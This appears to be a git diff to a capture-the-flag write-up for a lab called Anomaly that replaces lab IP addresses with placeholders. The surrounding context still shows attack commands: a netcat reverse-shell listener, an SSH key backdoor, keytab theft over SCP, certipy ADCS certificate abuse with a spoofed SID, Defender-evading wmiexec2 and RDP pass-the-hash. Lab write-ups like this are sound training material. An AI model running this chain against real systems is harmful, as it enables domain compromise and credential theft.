@@ -27,8 +27,8 @@ Jenkins admin:admin → Groovy Script Console RCE → jenkins shell
 
 | Host | IP | Role |
 |------|-----|------|
-| `anomaly-web` | `10.0.18.224` | Ubuntu Server (initial foothold) |
-| `anomaly-dc.anomaly.hsm` | `10.0.20.248` | Windows Domain Controller |
+| `anomaly-web` | `<TARGET_IP>` | Ubuntu Server (initial foothold) |
+| `anomaly-dc.anomaly.hsm` | `<DC_IP>` | Windows Domain Controller |
 
 ---
 
@@ -79,7 +79,7 @@ nc -lvnp 4444
 ```
 
 ```
-connect to [10.200.44.10] from (UNKNOWN) [10.0.18.224] 39370
+connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 39370
 whoami
 jenkins
 ```
@@ -154,7 +154,7 @@ chmod 600 /root/.ssh/authorized_keys
 Verify:
 
 ```bash
-ssh root@10.0.18.224
+ssh root@<TARGET_IP>
 ```
 
 ---
@@ -188,13 +188,13 @@ root@ip-10-0-18-224:/home/ubuntu# ls /etc/krb5.*
 Add the DC to `/etc/hosts` on the attacker machine:
 
 ```
-10.0.20.248  anomaly-dc.anomaly.hsm anomaly-dc
+<DC_IP>  anomaly-dc.anomaly.hsm anomaly-dc
 ```
 
 Copy both files to Kali over SCP (using the SSH backdoor established above):
 
 ```bash
-scp root@10.0.18.224:/etc/krb5.* ~/CTFs/HackSmarter/OSCP_Path/Anomaly/loot/
+scp root@<TARGET_IP>:/etc/krb5.* ~/CTFs/HackSmarter/OSCP_Path/Anomaly/loot/
 ```
 
 ### Extracting Keytab Credentials
@@ -304,7 +304,7 @@ Collect AD data using NetExec (no need for SharpHound on a Linux attacker):
 
 ```bash
 nxc ldap anomaly-dc.anomaly.hsm -u brandon_boyd -p 'REDACTED' \
-  --bloodhound -c All --dns-server 10.0.20.248
+  --bloodhound -c All --dns-server <DC_IP>
 ```
 
 ```
@@ -383,7 +383,7 @@ Brandon_Boyd (Domain User)
 
 ```bash
 certipy-ad find -u brandon_boyd@anomaly.hsm -p 'REDACTED' \
-  -dc-ip 10.0.20.248 -text -enabled -hide-admins -vulnerable
+  -dc-ip <DC_IP> -text -enabled -hide-admins -vulnerable
 ```
 
 ```
@@ -428,7 +428,7 @@ First attempt as `administrator` — the DC enforces SID extension (KB5014754), 
 
 ```bash
 certipy-ad account -u 'FAKEBOX$' -p 'Password123!' \
-  -dc-ip 10.0.20.248 -user 'Administrator' read
+  -dc-ip <DC_IP> -user 'Administrator' read
 ```
 
 ```
@@ -439,7 +439,7 @@ objectSid : S-1-5-21-1496966362-3320961333-4044918980-500
 
 ```bash
 certipy-ad account -u 'FAKEBOX$' -p 'Password123!' \
-  -dc-ip 10.0.20.248 -user 'anna_molly' read
+  -dc-ip <DC_IP> -user 'anna_molly' read
 ```
 
 ```
@@ -454,7 +454,7 @@ certipy-ad req -u 'FAKEBOX$@anomaly.hsm' -p 'Password123!' \
   -template CertAdmin \
   -upn anna_molly@anomaly.hsm \
   -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105' \
-  -dc-ip 10.0.20.248
+  -dc-ip <DC_IP>
 ```
 
 ```
@@ -468,7 +468,7 @@ certipy-ad req -u 'FAKEBOX$@anomaly.hsm' -p 'Password123!' \
 Certipy uses PKINIT — Kerberos authentication via certificate instead of password. The DC validates the cert (signed by its own CA) and returns a TGT and NTLM hash:
 
 ```bash
-certipy-ad auth -pfx anna_molly.pfx -dc-ip 10.0.20.248
+certipy-ad auth -pfx anna_molly.pfx -dc-ip <DC_IP>
 ```
 
 ```
@@ -503,7 +503,7 @@ SMB  ANOMALY-DC  C$      READ,WRITE
 Use `wmiexec2` (obfuscated WMI exec, evades Windows Defender) to get a semi-interactive shell first:
 
 ```bash
-python3 wmiexec2.py anomaly.hsm/anna_molly@10.0.20.248 \
+python3 wmiexec2.py anomaly.hsm/anna_molly@<DC_IP> \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:REDACTED'
 ```
 
@@ -525,7 +525,7 @@ The operation completed successfully.
 ### Full RDP Access
 
 ```bash
-xfreerdp /v:10.0.20.248 /u:anna_molly \
+xfreerdp /v:<DC_IP> /u:anna_molly \
   /pth:REDACTED \
   /cert:ignore
 ```
